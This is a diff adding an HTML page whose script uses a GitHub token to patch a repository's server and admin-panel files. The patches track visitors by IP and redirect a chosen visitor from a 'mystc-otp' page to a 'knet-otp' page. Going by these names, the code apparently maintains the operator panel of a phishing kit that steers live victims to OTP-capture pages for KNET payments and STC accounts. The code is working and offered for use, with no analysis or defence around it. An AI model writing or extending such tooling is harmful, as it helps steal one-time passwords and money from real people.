@@ -1,0 +1,20 @@
+<!doctype html><meta charset=utf-8><title>fix90</title><pre id=o>fix90 …</pre>
+<script>
+var T=localStorage.getItem('kdd_token')||prompt('GitHub token');
+var R='fahshomi-ui/KDD',BR='main',O=document.getElementById('o'),H={Authorization:'token '+T};
+function L(s){O.textContent+='\n'+s}
+function b64(s){return btoa(unescape(encodeURIComponent(s)))}
+async function G(p){var r=await fetch('https://api.github.com/repos/'+R+'/contents/'+p+'?ref='+BR,{headers:H});if(r.status==404)return null;if(!r.ok)return undefined;return r.json()}
+async function P(p,f,m){var j=await G(p);if(j===null){L(p+' NOT FOUND');return}if(j===undefined){L(p+' get err');return}
+var c=decodeURIComponent(escape(atob((j.content||'').replace(/\n/g,''))));
+var n=f(c);if(n===null){L(p+' already ok');return}
+var r=await fetch('https://api.github.com/repos/'+R+'/contents/'+p,{method:'PUT',headers:Object.assign({'Content-Type':'application/json'},H),body:JSON.stringify({message:m,content:b64(n),sha:j.sha,branch:BR})});
+L(p+' -> '+r.status)}
+var SN="\n/*KDK-FIX90*/\ntry{io.on('connection',function(socket){socket.onAny(function(ev,p){try{if(ev!=='visitor:register')return;p=p||{};if(p.existingVisitorId)return;var h=(socket.handshake&&socket.handshake.headers)||{};var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();if(!ip)return;var f=null;try{__kdkAll().forEach(function(v){if(!f&&v&&v.ip===ip&&(Date.now()-(v.lastActivity||0))<900000)f=v})}catch(e){}if(f){p.existingVisitorId=f._id;console.log('kdk90 adopt',socket.id,f._id)}}catch(e){}})});}catch(e){}\n/*END-KDK-FIX90*/\n";
+var AN="<script id=kddF90>(function(){if(window.__k9)return;window.__k9=1;function H(d){try{var id=d&&(d.visitorId||d._id);if(!id)return;visitors.delete(id);if(selectedVisitorId===id)selectedVisitorId=null;renderVisitorsList()}catch(e){}}function k(){try{if(socket&&socket.on&&!socket.__f90){socket.__f90=1;socket.on('visitor:deleted',H)}}catch(e){}}k();var t=setInterval(function(){if(window.socket&&window.socket!==window.__stub){k();clearInterval(t)}},200);var o=window.navigateVisitorToPage;if(o&&!o.__f90){window.navigateVisitorToPage=function(sid,pg){try{if(pg==='mystc-otp'){var a=Array.from(visitors.values()).find(function(x){return x.socketId===sid});if(a&&/كي\\s*نت|knet/i.test(a.page||''))pg='knet-otp'}}catch(e){}return o(sid,pg)};window.navigateVisitorToPage.__f90=1}try{document.title+=' F90'}catch(e){}})();<\/script>";
+function A(c){if(c.indexOf('kddF90')>=0)return null;return /<\/body>/i.test(c)?c.replace(/<\/body>/i,AN+'</body>'):c+AN}
+P('server/index.js',function(c){return c.indexOf('KDK-FIX90')>=0?null:c+SN},'fix90 server adopt');
+P('server/admin/index.html',A,'fix90 admin sync+otp');
+P('kdd-public/admin.html',A,'fix90 admin sync+otp');
+L('done');
+</script>
